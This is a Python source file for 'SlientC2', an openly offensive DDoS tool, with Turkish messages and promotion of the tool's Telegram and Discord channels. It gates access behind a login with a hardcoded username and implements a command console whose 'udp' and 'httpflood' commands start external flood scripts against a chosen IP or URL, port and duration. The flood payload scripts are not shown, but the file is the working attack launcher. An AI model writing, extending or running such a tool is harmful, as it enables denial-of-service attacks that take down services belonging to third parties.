#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 – httpflood argüman sırası düzeltildi.

import os
import sys
import time
import subprocess
import getpass
import random
import datetime
from colorama import Fore, init, Style

init(autoreset=True)

if os.name == 'nt':
    os.system("chcp 65001 > nul")
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# ========== GRADIENT ==========
line_palette = [255, 254, 253, 117, 81, 45, 39, 45, 81, 117, 153, 189, 255]

def gradient_text(text):
    result = ""
    for i, char in enumerate(text):
        color = line_palette[i % len(line_palette)]
        result += f"\033[38;5;{color}m{char}"
    return result + "\033[0m"

pad = " " * 4
small_pad = " " * 7

ascii_art = [
"         ╔═╗ ╦   ╦ ╔═╗ ╔╗╔ ╔╦╗",
"         ╚═╗ ║   ║ ║╣  ║║║  ║ ",
"         ╚═╝ ╚═╝ ╩ ╚═╝ ╝╚╝  ╩ "
]

def show_logo_and_boxes():
    os.system('clear')
    for line in ascii_art:
        print(gradient_text(pad + line))
    print(gradient_text(pad + "╔════════════════════════════════════╗"))
    print(gradient_text(pad + "║        DdoS Attack Tool            ║"))
    print(gradient_text(pad + "║      Telegram: @SlientBotnet       ║"))
    print(gradient_text(pad + "╚════════════════════════════════════╝"))
    print(gradient_text(small_pad + "╔══════════════════════════════╗"))
    print(gradient_text(small_pad + "║    write 'help' for usage    ║"))
    print(gradient_text(small_pad + "╚══════════════════════════════╝"))
    print("\n")

# ========== LOGIN ==========
KULLANICI_ADI = "Zeldy"
SIFRE = " "

def login():
    os.system('clear')
    print(gradient_text(pad + "╔═════════════════════════════════════╗"))
    print(gradient_text(pad + "║      Slient DdoS Login              ║"))
    print(gradient_text(pad + "║   For the password: t.me/Zeldy_here ║"))
    print(gradient_text(pad + "╚═════════════════════════════════════╝"))
    
    username = input("Username:  ")
    password = getpass.getpass("password: ")
    
    if username != KULLANICI_ADI or password != SIFRE:
        print("\nHatalı kullanıcı adı veya şifre!")
        time.sleep(2)
        return False
    
    os.system('clear')
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mSlient \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Zeldy ! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Zeldy \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v4.0')
    time.sleep(0.5)
    return True

# ========== PROMPT ==========
def prompt():
    print(Fore.WHITE + "┌──[SlientC2] - [SlientC2/root]")
    print(Fore.WHITE + "└─➤  ", end="")
    sys.stdout.write("\033[0m")
    sys.stdout.flush()
    return input()

# ========== SALDIRI BANNER ==========
def show_attack_banner(target, port, duration, method, threads="2048/16384", vip=True, expiry=864.70, cooldown=0.00):
    now = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    sent_by = "root"
    vip_str = "true" if vip else "false"
    method_upper = method.upper()

    attacksent_art = [
        "╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗",
        "╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║ ",
        "╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩ "
    ]
    for line in attacksent_art:
        print(gradient_text(pad + line.center(60)))

    width = 60
    border = "═" * (width - 2)
    empty = " " * (width - 2)

    def center(text):
        return text.center(width - 2)

    def left(text):
        return text.ljust(width - 2)

    print(gradient_text(pad + "╔" + border + "╗"))
    print(gradient_text(pad + "║" + left(f"  Target: [{target}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Time: [{duration}]s") + "║"))
    print(gradient_text(pad + "║" + left(f"  Port: [{port}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Method: [{method_upper}]") + "║"))
    print(gradient_text(pad + "╠" + "═" * (width - 2) + "╣"))
    print(gradient_text(pad + "║" + left(f"  Threads: [{threads}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  VIP: {vip_str}") + "║"))
    print(gradient_text(pad + "║" + left(f"  Expiry: [{expiry:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Cooldown: [{cooldown:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Timestamp: [{now}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Sent by: [{sent_by}]") + "║"))
    print(gradient_text(pad + "║" + empty + "║"))
    print(gradient_text(pad + "║" + left("  Join: t.me/artichetm2") + "║"))
    print(gradient_text(pad + "║" + left("  Discord: @articnetxv") + "║"))
    print(gradient_text(pad + "╚" + border + "╝"))
    print("\n" + Fore.CYAN + "[*] Saldırı başlatılıyor..." + Fore.WHITE + "\n")

# ========== KOMUT İŞLEYİCİ ==========
def run_script(script_name, args):
    if not os.path.exists(script_name):
        possible = [f for f in os.listdir('.') if f.lower() == script_name.lower()]
        if possible:
            script_name = possible[0]
        else:
            print(f"[!] {script_name} dosyası bulunamadı!")
            print(f"[!] Mevcut .py dosyaları: {', '.join([f for f in os.listdir('.') if f.endswith('.py')])}")
            return
    cmd = ["python3", script_name] + args
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] {script_name} çalıştırılırken hata oluştu (kod: {e.returncode})")
    except FileNotFoundError:
        print("[!] python3 bulunamadı. 'pkg install python' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_go_script(script_name, args):
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["go", "run", script_name] + args
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] {script_name} çalıştırılırken hata oluştu (kod: {e.returncode})")
    except FileNotFoundError:
        print("[!] 'go' komutu bulunamadı. 'pkg install golang' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def cmd_udp(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: udp <ip> <port> <süre>")
        print("Örnek: udp 1.1.1.1 80 60")
        return
    ip, port, duration = args[0], args[1], args[2]
    show_attack_banner(ip, port, duration, "UDP", threads="2048/16384", vip=True)
    run_script("udp.py", [ip, port, duration])

def cmd_httpflood(args):
    """httpflood komutu: httpflood <url> <süre> [threads]"""
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: httpflood <url> <süre> [threads]")
        print("Örnek: httpflood https://example.com 60 500")
        return
    url = args[0]
    duration = args[1]
    threads = args[2] if len(args) > 2 else "500"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-FLOOD", threads=threads, vip=True)
    # httpflood.go argüman sırası: url, threads, method, seconds, header
    run_go_script("httpflood.go", [url, threads, "get", duration, "nil"])

# ========== MAIN ==========
def main():
    if not login():
        return

    show_logo_and_boxes()
    print("[!] Saldırı fonksiyonları harici scriptlerle çalıştırılır.")
    print("[!] Komutlar: help, exit, udp <ip> <port> <süre>, httpflood <url> <süre> [threads]")
    print("[!] Örnek: udp 1.1.1.1 80 60")
    print("[!] Örnek: httpflood https://example.com 60 500\n")

    try:
        while True:
            raw = prompt().strip()
            if not raw:
                continue
            parts = raw.split()
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd in ("exit", "quit", "q"):
                break
            elif cmd == "help":
                print("Mevcut komutlar:")
                print("  help                     - Bu mesaj")
                print("  exit                     - Çıkış")
                print("  udp <ip> <port> <süre>   - UDP saldırısı (süre saniye)")
                print("  httpflood <url> <süre> [threads] - HTTP Flood (threads varsayılan 500)")
                print("Örnekler:")
                print("  udp 1.1.1.1 443 120")
                print("  httpflood https://example.com 60 1000")
            elif cmd == "udp":
                cmd_udp(args)
            elif cmd == "httpflood":
                cmd_httpflood(args)
            else:
                print("Bilinmeyen komut. 'help' yazın.")
    except KeyboardInterrupt:
        print("\nÇıkılıyor...")
        sys.exit(0)

if __name__ == "__main__":
    main()